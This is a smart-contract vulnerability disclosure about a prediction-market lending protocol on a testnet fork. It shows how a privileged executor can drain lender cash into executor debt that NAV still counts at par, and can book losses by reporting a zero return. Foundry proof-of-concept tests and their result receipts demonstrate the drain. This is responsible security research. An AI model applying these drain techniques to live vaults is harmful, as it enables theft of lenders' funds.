# Based on deployed contracts

Project: PM-01 — name-redacted prediction-market lending protocol
Category: Prediction-market collateral lending, leveraged outcome positions and asynchronous lending vault
Severity: High — mainnet-posture / privileged-control risk; testnet-fork demonstration
Engagement: Independent hunting + responsible disclosure
Chain: Polygon Amoy testnet, chain ID 80002; source/fork snapshot block 51,383,934 (28 October 2026)
Tech stack: Solidity 0.8.26 / EVM, OpenZeppelin, ERC20, ERC1155, ERC4626 and ERC7540-style asynchronous redemption; Foundry / local Anvil fork tooling
Evidence: Historical local-fork test source and reported results; synthetic setup described below
Remediation: No confirmed remediation is established.
Contribution: Independent security research; program acceptance is not asserted.
Proof availability: Excerpts and source references; the original harness is not distributed.

# Single-controller custody and self-reported accounting

## Description

The authorized executor can move lender principal to a placing wallet before a venue fill is independently established, then determine how that exposure is represented on-chain. A timed-out reservation with no returned cash becomes `executorDebt`, which is included in vault NAV at face value. Separately, the executor can report a completed position's return as zero and close it through the loss waterfall without paying principal back. Both paths trust the operator's off-chain activity rather than verifying venue custody or proceeds.

The deployment record identifies the same controller for executor, guardian, liquidation wallet, remitter and treasury. The later source-review register records that controller also holding proposer, executor and canceller timelock roles. Mark and quote signers were distinct addresses in the census; they were not the same key. Governance can rotate those signers, but that is a separate authorized action.

This is a privileged trust-boundary finding. It requires the executor role and, for synthetic reservations, a cooperating placing wallet plus a valid quote, margin and charge funding. The proof installs a controlled quote signer through timelock impersonation. It does not demonstrate obtaining a production quote for a fabricated intent or compromising any key. The custodial design makes an operator failure or compromise consequential; it does not create permissionless access to `reserveOpen` or `closeLeverage`.

The deployment association is with the recorded Polygon Amoy testnet snapshot. Provider-runtime comparison does not establish independent recompilation, equivalence to an earlier audit revision, or a mainnet incident.

### Mechanism step by step

#### Step 1 — Disburse principal before a verified fill

Source: `src/Leverage.sol:135-142`

```solidity
        // slither-disable-next-line arbitrary-send-erc20
        pusd.safeTransferFrom(i.trader, address(this), i.margin);
        vault.disburse(i.trader, i.principal);

        uint256 chargeEscrow;
        (intentId, chargeEscrow) = ledger.openReservation(i, q);
        emit Events.OpenReserved(intentId, i.coid, i.trader, i.principal, i.margin, chargeEscrow, i.ttl);
        _pullChargeEscrow(i.trader, i.principal, chargeEscrow);
```

An authorized executor submits a quote-bound `OpenIntent`. The contract checks the quote's intent fields and signature, takes trader margin and charge escrow, and disburses principal to the trader wallet (`src/Leverage.sol:111-142`). These checks bind terms; they do not establish a venue fill.

#### Step 2 — Recover only available wallet cash

Source: `src/Leverage.sol:194-207`

```solidity
    function timeoutAbort(uint256 intentId) external nonReentrant {
        ILedger.Reservation memory r = ledger.reservation(intentId);
        uint256 owed = uint256(r.principal) - r.filledNotional;

        // Pull what the wallet's balance and allowance actually permit, never reverting on the
        // gap: the trader's refund and the pool's headroom must not wait on the executor's cash
        // (I14). The gap books as executor debt in the same transaction.
        uint256 returnable = pusd.balanceOf(r.trader);
        uint256 allowed = pusd.allowance(r.trader, address(this));
        if (allowed < returnable) returnable = allowed;
        if (owed < returnable) returnable = owed;

        // TTL plus grace is enforced in the Ledger transition, before any state moves.
        (uint256 posId, uint256 charges, uint256 refund, uint256 debt) = ledger.timeoutReservation(intentId, returnable);
```

In the reservation branch, the cooperating wallet moves away its cash and clears allowance. After TTL plus grace, anyone can call `timeoutAbort`. The contract collects only what balance and allowance permit, with no revert for the remainder (`src/Leverage.sol:194-222`).

#### Step 3 — Convert the missing principal to executor debt

Source: `src/Ledger.sol:714-718`

```solidity
        debt = owed - principalReturned;
        if (debt != 0) {
            executorDebt[intentId] = debt;
            totalExecutorDebt += debt;
        }
```

Ledger aborts the unfilled reservation, releases its outstanding-principal and budget accounting, and records the unrecovered amount as executor debt (`src/Ledger.sol:691-718,1285-1300`). Margin and unused escrow are refunded according to the abort path; the unpaid principal is not deducted from NAV.

#### Step 4 — Keep the receivable in NAV

Source: `src/Ledger.sol:1349-1353`

```solidity
    function _totalAssets() internal view returns (uint256) {
        return
            idle + totalPrincipalOutstanding + totalExecutorDebt + accruedIncome()
                + _deferredDue(uint64(block.timestamp));
    }
```

`_totalAssets` adds that receivable at full value. A lender can therefore see a par-valued share while redemption is limited by remaining real cash (`src/Ledger.sol:1345-1352`; `src/LatUSD.sol:151-152`). Collection is not guaranteed: `repayExecutorDebt` requires someone to transfer cash back (`src/Leverage.sol:416-423`).

#### Step 5 — Close on an executor-supplied return

Source: `src/Leverage.sol:226-257`

```solidity
    function closeLeverage(uint256 posId, uint256 returned) external nonReentrant onlyExecutor {
        ILedger.Position memory p = ledger.position(posId);
        if (p.status != PositionStatus.Open) revert Errors.PositionNotOpen(posId);

        uint256 notional = p.notional;
        uint256 shortfall = returned < notional ? notional - returned : 0;

        emit Events.LeverageClosed(posId, returned, shortfall);

        // I6 in code order: forfeited margin first, then the position's own escrowed income, then
        // Buffer cash, and only the remainder books as pool loss. The income layer is pure
        // accounting — the escrow cash already sits in the vault and nets the loss in the Ledger —
        // so only genuine Buffer cash earns a repayment claim.
        uint256 marginAbsorbed = shortfall < p.margin ? shortfall : p.margin;
        uint256 stillShort = shortfall - marginAbsorbed;

        uint256 fronted = 0;
        uint256 bufferCash = 0;
        if (stillShort != 0) {
            uint256 escrow = ledger.escrowedIncome(posId);
            fronted = stillShort < escrow ? stillShort : escrow;
            uint256 pastIncome = stillShort - fronted;
            if (pastIncome != 0) bufferCash = IBuffer(buffer).cover(posId, pastIncome);
        }

        ledger.closePosition(posId, returned, marginAbsorbed + bufferCash, fronted);

        // Cash legs, all amounts fixed above: the debt back from the executor, forfeited margin
        // out of Pool custody, and the trader's remainder — margin plus any surplus above the
        // debt, because the pool earns charges, never upside.
        uint256 toVault = returned < notional ? returned : notional;
        if (toVault != 0) pusd.safeTransferFrom(msg.sender, address(vault), toVault);
```

In the separate close branch, the executor records fill notional/shares and completes a position. Ledger verifies reservation bounds and fill-ID uniqueness, but has no venue proof check (`src/Ledger.sol:654-664`). The executor then supplies `returned=0`; shortfall consumes margin, prepaid income and any available Buffer coverage, with the remainder booked as pool loss. The executor transfer is skipped because the calculated `toVault` is zero (`src/Leverage.sol:226-257`).

#### Step 6 — Release budget for repeated reservations

Source: `src/Ledger.sol:1285-1300`

```solidity
    function _abort(uint256 intentId, uint256 principalReturned) internal returns (uint256 principal, uint256 refund) {
        Reservation storage r = _reservations[intentId];
        if (r.status != ReservationStatus.Reserved) revert Errors.ReservationNotActive(intentId);
        if (r.filledNotional != 0) revert Errors.AbortAfterFill(intentId);

        r.status = ReservationStatus.Aborted;
        principal = r.principal;
        uint256 escrow = r.chargeEscrow;
        refund = uint256(r.margin) + escrow;
        // An increase booked its escrow on the target at reserve (I33); nothing was charged.
        uint256 target = r.targetPosId;
        if (target != 0) _positions[target].chargesPaid -= uint128(escrow); // fits: booked from a uint128

        idle += principalReturned;
        totalPrincipalOutstanding -= principal;
        _releaseBudget(r.tokenId, principal);
```

The two-round follow-up shows the reservation path can repeat after budget and outstanding-principal release. The original register's “utilization cap” description is not a cumulative extraction bound: the recorded loop moves 80,000 of a 100,000 cash book into debt across two 40,000 rounds. Remaining idle cash, per-round gates, quotes and funding still constrain further execution (`poc/src/LoopDrain.t.sol:45-81`; `poc/README.md:58-62`).

### Impact and proof limits

The 40,000 reservation receipt reports 100,000 NAV alongside 60,000 vault cash. The lender-exit follow-up assigns only 60,000 claimable assets, with 40,000 still pending. Despite its `lenderCashOut` label, that test reads `claimableAssets`; it does not execute a final redemption transfer (`poc/src/FinalProofs.t.sol:140-153`). It establishes a cash-constrained exit entitlement, not an observed on-chain payment to a real lender.

The zero-return close receipt books 29,599.908675 pUSD of pool loss on a 40,000 notional position after the funded margin/income waterfall, with no executor payment. It proves that the authorized report controls the loss outcome. It does not prove what an external venue actually sold or that an operator retained real venue proceeds. Under-remitting liquidation proceeds is another trusted-role exposure (`src/Liquidator.sol:142-160`), but the cited V1 tests do not independently prove that venue-side leg.

The later two-round receipt reports 80,000 executor debt and 20,000 remaining idle while NAV still reports 100,000. This is gross cash diversion, not net profit after trader funding, fees or recovery. High is the source's mainnet-posture assessment if this control model were carried into a funded production deployment; no mainnet deployment or loss is established.

## Proof of concept

Historical results:

| Test | What it establishes | Recorded result source |
|---|---|---|
| `test_poc4_executorDebtNavIllusion` | One reservation times out into debt while NAV remains at par | `poc/src/[project]ForkPoCs.sol:314-354`; `poc/README.md:23,32` |
| `test_poc5_closeLeverageZeroBookBurn` | Executor reports zero return, pays nothing, and books a loss | `poc/src/[project]ForkPoCs.sol:360-391`; `poc/README.md:24,33` |
| `test_t1_executorDebtBlocksLenderExit` | Remaining cash supports only part of the lender's requested redemption | `poc/src/FinalProofs.t.sol:121-153`; `poc/README.md:40,48` |
| `test_fakeReservationLoopsUntilIdleIsGone` | Two sequential reservations release enough budget to repeat the cash diversion | `poc/src/LoopDrain.t.sol:45-81`; `poc/README.md:58-62` |

The original five-test suite and final six-test suite are recorded as passing in `poc/README.md:14,36`. The loop has its own receipt. The empty `poc/receipts.txt` is not independent evidence; the retained receipts are in the README.

## Relevant test excerpts

Setup replaces signers through a privileged timelock-address prank and mints test settlement tokens to the lender. The omitted preceding fork-selection line contains the redacted RPC URL. This is controlled test scaffolding, not a demonstrated governance compromise.

Source: `poc/src/[project]ForkPoCs.sol:148-161`

```solidity
        markSigner = vm.addr(markKey);
        quoteSigner = vm.addr(quoteKey);
        // Test scaffolding: install test signers behind the timelock address.
        vm.startPrank(TL);
        pool.setMarkSigner(markSigner);
        liq.setMarkSigner(markSigner);
        oracle.setSigner(quoteSigner);
        vm.stopPrank();
        // Lender funds the book.
        pusd.mint(lender, 100_000e6);
        vm.startPrank(lender);
        pusd.approve(VAULT, type(uint256).max);
        vault.deposit(100_000e6, lender);
        vm.stopPrank();
```

The reservation test funds the cooperating trader and signs the exact intent before impersonating the executor:

Source: `poc/src/[project]ForkPoCs.sol:315-332`

```solidity
        address trader = address(0x4444);
        uint256 principal = 40_000e6;
        pusd.mint(trader, 6_000e6); // margin + charge escrow headroom
        vm.prank(trader);
        pusd.approve(LEVERAGE, type(uint256).max);

        LeverageQuote memory q = LeverageQuote(
            bytes32("coid-1"), trader, TOKEN_ID, principal, 3600, 100, 10, uint64(block.timestamp) + 300);
        OpenIntent memory i = OpenIntent({
            coid: bytes32("coid-1"), trader: trader, tokenId: TOKEN_ID, margin: 5_000e6,
            principal: principal, ttl: uint64(block.timestamp) + 60, maxChargeBps: 0, maxTotalCharges: 0});

        uint256 assetsBefore = vault.totalAssets();
        uint256 idleBefore = ledger.idle();
        bytes memory lqSig = _signLq(q);
        vm.prank(EXECUTOR);
        uint256 intentId = lev.reserveOpen(i, q, lqSig);
        assertTrue(pusd.balanceOf(trader) >= principal, "principal disbursed to placing wallet");
```

Action and checks: cash leaves the wallet, allowance is removed, the timeout books debt, and NAV is preserved:

Source: `poc/src/[project]ForkPoCs.sol:334-350`

```solidity
        // Sybil wallet moves the principal out and drops the allowance.
        vm.startPrank(trader);
        pusd.transfer(address(0x5555), pusd.balanceOf(trader));
        pusd.approve(LEVERAGE, 0);
        vm.stopPrank();

        vm.warp(block.timestamp + 60 + ledger.timeoutGrace() + 1);
        vm.prank(attacker); // permissionless timeout
        lev.timeoutAbort(intentId);

        assertEq(ledger.executorDebt(intentId), principal, "gap booked as executor debt");
        uint256 assetsAfter = vault.totalAssets();
        assertEq(ledger.idle(), idleBefore - principal, "cash left the vault");
        // NAV still counts the debt as an asset: share price reads par.
        assertTrue(assetsAfter >= assetsBefore, "NAV propped by uncollectible receivable");
        uint256 cashInVault = pusd.balanceOf(VAULT);
        assertTrue(cashInVault <= idleBefore - principal + 6_000e6, "real cash is gone");
```

The close test uses funded trader margin and a controlled quote (`poc/src/[project]ForkPoCs.sol:361-372`), then records its own fill and closes at zero return:

Source: `poc/src/[project]ForkPoCs.sol:373-388`

```solidity
        vm.startPrank(EXECUTOR);
        uint256 intentId = lev.reserveOpen(i, q, lqSig);
        lev.recordFill(intentId, FillRef(bytes32("fill-1"), principal, 66_666e6));
        lev.completeOpen(intentId);
        uint256 posId = intentId; // an open finalizes at the intent's own id

        uint256 execBalBefore = pusd.balanceOf(EXECUTOR);
        uint256 lossesBefore = ledger.realizedLosses();
        lev.closeLeverage(posId, 0); // "the venue returned nothing"
        vm.stopPrank();

        Position memory p = ledger.position(posId);
        assertTrue(p.status == PositionStatus.Closed, "position closed");
        assertEq(pusd.balanceOf(EXECUTOR), execBalBefore, "executor paid nothing");
        uint256 loss = ledger.poolLoss(posId);
        assertTrue(loss >= 29_000e6, "book eats notional minus margin minus escrow");
```

The lender-exit proof checks claimable assets, not an executed payout:

Source: `poc/src/FinalProofs.t.sol:140-150`

```solidity
        // Lender tries to leave with everything. NAV says ~par; cash says no.
        uint256 nav = vault.totalAssets();
        uint256 shares = IERC20M(VAULT).balanceOf(lender);
        vm.prank(lender);
        vault.requestRedeem(shares, lender, lender);
        vault.crank(type(uint256).max);
        uint256 claimable = vault.claimableAssets(lender);
        uint256 stuck = shares / 1e12 - claimable; // shares are 18dec, assets 6dec
        assertTrue(claimable <= 60_100e6, "lender only gets the remaining cash");
        assertTrue(stuck >= 39_000e6, "the fake-debt slice is not redeemable");
        assertTrue(nav >= 99_000e6, "NAV still reads ~par on a fake receivable");
```

The repeatability assertions cover exactly two rounds, not an unbounded live drain:

Source: `poc/src/LoopDrain.t.sol:72-77`

```solidity
        assertEq(ledgerX.executorDebt(ids[0]), principal, "round 1 debt");
        assertEq(ledgerX.executorDebt(ids[1]), principal, "round 2 debt: budget and cap released between rounds");
        assertEq(ledger.idle(), idle0 - 2 * principal, "idle drained linearly per round");
        assertEq(ledgerX.totalExecutorDebt(), 2 * principal, "all of it parked as receivable");
        assertTrue(vault.totalAssets() >= nav0, "NAV still par after 80% of cash gone");
        assertTrue(pusd.balanceOf(VAULT) <= 25_000e6, "vault holds only dust cash");
```

Recorded receipts (pUSD values use six decimal places):

Source: `poc/README.md:32-33`

```text
V1_DEBT_RESULT={executorDebt:40000000000, navBefore:100000000000, navAfter:100000000000, vaultCash:60000000000}
V1_CLOSE0_RESULT={returned:0, executorPaid:0, poolLoss:29599908675, realizedLossesDelta:29599908675}
```

Source: `poc/README.md:48-48`

```text
V1_EXIT_RESULT={navReported:100000000000, lenderCashOut:60000000000, lenderStuck:40000000000, executorDebt:40000000000}
```

Source: `poc/README.md:60-60`

```text
`V1_LOOP_RESULT={rounds:2, idleBefore:100000000000, idleAfter:20000000000, executorDebt:80000000000, nav:100000000000, loopBound:idleOnly}`
```

### Remediation direction

Bind fill and settlement accounting to independently verifiable custody/proceeds, or state and enforce a bounded custodial credit model. Separate executor, treasury/remitter, emergency control and governance authority. Cap unsettled executor exposure across timeouts as well as active reservations; do not release the only effective exposure limit while carrying the unpaid amount at par. Define impairment/write-off rules and lender-visible treatment for uncollectible receivables. Provide a safe independent recovery path without giving an untrusted caller authority to fabricate venue returns.

No implemented remediation or post-fix validation is established by the available evidence.
